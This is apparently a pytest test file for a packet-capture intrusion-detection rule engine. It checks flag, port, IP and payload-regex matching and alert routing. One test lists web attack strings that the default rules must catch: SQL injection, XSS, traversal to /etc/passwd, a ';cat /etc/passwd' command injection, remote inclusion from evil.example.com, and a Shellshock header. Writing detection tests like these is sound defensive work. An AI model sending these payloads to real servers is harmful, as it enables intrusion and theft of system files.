import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from datetime import datetime, timezone

from packet_capture.models import PacketData, Protocol
from rule_engine.interfaces import AlertHandler
from rule_engine.models import Alert, Rule, Severity
from rule_engine.rule_engine import RuleEngine, rule_matches


def _tcp_packet(dst_port=22, flags="SYN", src_ip="10.0.0.1", dst_ip="10.0.0.2") -> PacketData:
    return PacketData(
        timestamp=datetime.now(timezone.utc),
        protocol=Protocol.TCP,
        src_ip=src_ip,
        dst_ip=dst_ip,
        src_port=51000,
        dst_port=dst_port,
        tcp_flags=flags,
        ttl=64,
        packet_size=60,
    )


def _icmp_packet() -> PacketData:
    return PacketData(
        timestamp=datetime.now(timezone.utc),
        protocol=Protocol.ICMP,
        src_ip="10.0.0.1",
        dst_ip="10.0.0.2",
        ttl=64,
        packet_size=60,
    )


class CollectingAlertHandler(AlertHandler):
    def __init__(self):
        self.alerts: list[Alert] = []

    def handle(self, alert: Alert) -> None:
        self.alerts.append(alert)


def test_rule_matches_ssh_syn_packet():
    rule = Rule(name="SSH", protocol="tcp", dst_port="22", flags=["SYN"])
    packet = _tcp_packet(dst_port=22, flags="SYN")
    assert rule_matches(rule, packet) is True


def test_rule_does_not_match_wrong_port():
    rule = Rule(name="SSH", protocol="tcp", dst_port="22", flags=["SYN"])
    packet = _tcp_packet(dst_port=80, flags="SYN")
    assert rule_matches(rule, packet) is False


def test_rule_disabled_never_matches():
    rule = Rule(name="SSH", protocol="tcp", dst_port="22", flags=["SYN"], enabled=False)
    packet = _tcp_packet(dst_port=22, flags="SYN")
    assert rule_matches(rule, packet) is False


def test_rule_port_range_matches():
    rule = Rule(name="Common_Ports", protocol="tcp", dst_port="20-1024")
    assert rule_matches(rule, _tcp_packet(dst_port=445, flags="SYN")) is True
    assert rule_matches(rule, _tcp_packet(dst_port=8080, flags="SYN")) is False


def test_rule_port_list_matches():
    rule = Rule(name="Web_Ports", protocol="tcp", dst_port="80,443,8080")
    assert rule_matches(rule, _tcp_packet(dst_port=443, flags="SYN")) is True
    assert rule_matches(rule, _tcp_packet(dst_port=22, flags="SYN")) is False


def test_rule_null_scan_flags_none():
    rule = Rule(name="Null_Scan", protocol="tcp", flags=["NONE"])
    assert rule_matches(rule, _tcp_packet(flags=None)) is True
    assert rule_matches(rule, _tcp_packet(flags="SYN")) is False


def test_rule_flags_require_exact_match_not_subset():
    rule = Rule(name="SYNACK", protocol="tcp", flags=["SYN", "ACK"])
    assert rule_matches(rule, _tcp_packet(flags="SYN,ACK")) is True
    assert rule_matches(rule, _tcp_packet(flags="SYN")) is False


def test_fin_scan_rule_does_not_match_normal_connection_close():
    """
    Regression test: a normal HTTPS/TCP connection closing sends FIN,ACK —
    that must NOT match a rule looking for a lone FIN (real stealth scan).
    """
    rule = Rule(name="FIN_Scan", protocol="tcp", flags=["FIN"], severity=Severity.HIGH)
    normal_close = _tcp_packet(flags="FIN,ACK")
    real_fin_scan_probe = _tcp_packet(flags="FIN")

    assert rule_matches(rule, normal_close) is False
    assert rule_matches(rule, real_fin_scan_probe) is True


def test_rule_protocol_any_matches_icmp():
    rule = Rule(name="Anything", protocol="any")
    assert rule_matches(rule, _icmp_packet()) is True


def test_rule_ip_exact_match():
    rule = Rule(name="From_Specific_IP", protocol="tcp", src_ip="10.0.0.1")
    assert rule_matches(rule, _tcp_packet(src_ip="10.0.0.1")) is True
    assert rule_matches(rule, _tcp_packet(src_ip="10.0.0.9")) is False


def test_rule_engine_dispatches_alert_to_handler():
    engine = RuleEngine()
    engine._rules = [Rule(name="SSH", protocol="tcp", dst_port="22", flags=["SYN"], severity=Severity.HIGH, message="msg")]
    collector = CollectingAlertHandler()
    engine.register_alert_handler(collector)

    engine.handle(_tcp_packet(dst_port=22, flags="SYN"))

    assert len(collector.alerts) == 1
    assert collector.alerts[0].rule_name == "SSH"
    assert collector.alerts[0].severity == Severity.HIGH


def test_rule_engine_no_match_no_alert():
    engine = RuleEngine()
    engine._rules = [Rule(name="SSH", protocol="tcp", dst_port="22", flags=["SYN"])]
    collector = CollectingAlertHandler()
    engine.register_alert_handler(collector)

    engine.handle(_tcp_packet(dst_port=9999, flags="SYN"))

    assert len(collector.alerts) == 0


def test_rule_engine_loads_default_rules_file():
    rules_path = Path(__file__).resolve().parents[1] / "rules" / "default_rules.rules"
    engine = RuleEngine(rules_file=rules_path)
    assert len(engine.rules) >= 8


def test_rule_engine_hot_reload_picks_up_file_change(tmp_path):
    rules_file = tmp_path / "test.rules"
    rules_file.write_text("rule First\n    protocol tcp\nend\n")

    engine = RuleEngine(rules_file=rules_file)
    assert len(engine.rules) == 1

    # Simulate an edit — bump mtime forward so check_hot_reload definitely sees it
    import os
    import time

    time.sleep(0.01)
    rules_file.write_text("rule First\n    protocol tcp\nend\n\nrule Second\n    protocol udp\nend\n")
    new_time = os.path.getmtime(rules_file) + 5
    os.utime(rules_file, (new_time, new_time))

    engine.check_hot_reload()
    assert len(engine.rules) == 2


# -- Stage 5: payload-signature matching & routing --------------------------

def _tcp_payload_packet(payload: bytes, dst_port: int = 80, flags: str = "PA") -> PacketData:
    return PacketData(
        timestamp=datetime.now(timezone.utc),
        protocol=Protocol.TCP,
        src_ip="10.0.0.1",
        dst_ip="10.0.0.2",
        src_port=51000,
        dst_port=dst_port,
        tcp_flags=flags,
        ttl=64,
        packet_size=60 + len(payload),
        tcp_payload=payload,
    )


def _udp_payload_packet(payload: bytes, dst_port: int = 53) -> PacketData:
    return PacketData(
        timestamp=datetime.now(timezone.utc),
        protocol=Protocol.UDP,
        src_ip="10.0.0.1",
        dst_ip="10.0.0.2",
        src_port=53211,
        dst_port=dst_port,
        ttl=64,
        packet_size=20 + len(payload),
        udp_payload=payload,
    )


def test_rule_matches_against_tcp_payload():
    rule = Rule(
        name="SQLi",
        protocol="tcp",
        payload_regex=r"1' OR '1'='1",
    )
    hit = _tcp_payload_packet(b"/index.php?id=1' OR '1'='1")
    miss = _tcp_payload_packet(b"/index.php?id=42")
    assert rule_matches(rule, hit) is True
    assert rule_matches(rule, miss) is False


def test_rule_matches_against_udp_payload():
    rule = Rule(
        name="DNS_Anomaly",
        protocol="udp",
        payload_regex=r"random-query-name-payload",
    )
    hit = _udp_payload_packet(b"random-query-name-payload-bytes")
    miss = _udp_payload_packet(b"normal-lookup")
    assert rule_matches(rule, hit) is True
    assert rule_matches(rule, miss) is False


def test_rule_with_payload_regex_does_not_match_when_payload_empty():
    rule = Rule(name="X", protocol="tcp", payload_regex="UNION SELECT")
    empty = _tcp_payload_packet(b"")
    assert rule_matches(rule, empty) is False


def test_rule_engine_routes_payload_alerts_to_payload_handler():
    """Payload rules go to payload_alert_handlers, not regular alert_handlers."""
    rule = Rule(
        name="SQLi_Routed",
        protocol="tcp",
        payload_regex="OR '1'='1",
        severity=Severity.HIGH,
        is_payload_rule=True,
    )
    engine = RuleEngine()
    engine._rules = [rule]

    regular = CollectingAlertHandler()
    payload = CollectingAlertHandler()
    engine.register_alert_handler(regular)
    engine.register_payload_alert_handler(payload)

    engine.handle(_tcp_payload_packet(b"/?id=1 OR '1'='1"))

    assert regular.alerts == []
    assert len(payload.alerts) == 1
    assert payload.alerts[0].rule_name == "SQLi_Routed"


def test_rule_engine_routes_non_payload_alerts_to_regular_handler():
    """A regular rule (no payload_regex) still goes to the regular handler."""
    rule = Rule(
        name="SSH",
        protocol="tcp",
        dst_port="22",
        flags=["SYN"],
        severity=Severity.MEDIUM,
    )
    engine = RuleEngine()
    engine._rules = [rule]

    regular = CollectingAlertHandler()
    payload = CollectingAlertHandler()
    engine.register_alert_handler(regular)
    engine.register_payload_alert_handler(payload)

    engine.handle(_tcp_packet(dst_port=22, flags="SYN"))

    assert len(regular.alerts) == 1
    assert payload.alerts == []


def test_rule_engine_handles_simulator_http_attack_literal():
    """Regression: every literal in the simulator's HTTP_ATTACK_PATHS must
    match at least one default rule. This test iterates all 12 paths/UA
    literals so adding/removing a default rule breaks loudly."""
    from pathlib import Path as _P
    rules_path = _P(__file__).resolve().parents[1] / "rules" / "default_rules.rules"
    engine = RuleEngine(rules_file=rules_path)

    from rule_engine.rule_parser import parse_rules_file
    parsed = parse_rules_file(rules_path)
    payload_rules = [r for r in parsed if r.is_payload_rule]
    assert len(payload_rules) >= 10  # we ship 12; allow growth

    # Each simulator literal below must be matched by >=1 default rule.
    literals = [
        b"/index.php?id=1' OR '1'='1",
        b"/index.php?id=1 UNION SELECT username,password FROM users",
        b"/search?q=<script>alert('xss')</script>",
        b"/../../../../etc/passwd",
        b"/..%2f..%2f..%2fwindows%2fwin.ini",
        b"/cgi-bin/test.cgi?cmd=;cat /etc/passwd",
        b"/admin.php?page=http://evil.example.com/shell.txt",
        b"/index.php?exec=/bin/sh",
        b"/.git/config",
        b"/shell.php",
        b"User-Agent: () { :;}; /bin/bash -c 'echo shellshock'",
        b"User-Agent: sqlmap/1.7-dev",
        b"User-Agent: Nikto/2.1.6",
        b"User-Agent: Nmap Scripting Engine",
    ]
    hits = 0
    for lit in literals:
        # The literal must match at least one rule's payload_regex.
        matched = any(
            (r._compiled_regex is not None and r._compiled_regex.search(lit) is not None)
            for r in payload_rules
        )
        assert matched, f"No default payload rule matched simulator literal: {lit!r}"
        if matched:
            hits += 1
    assert hits == len(literals)
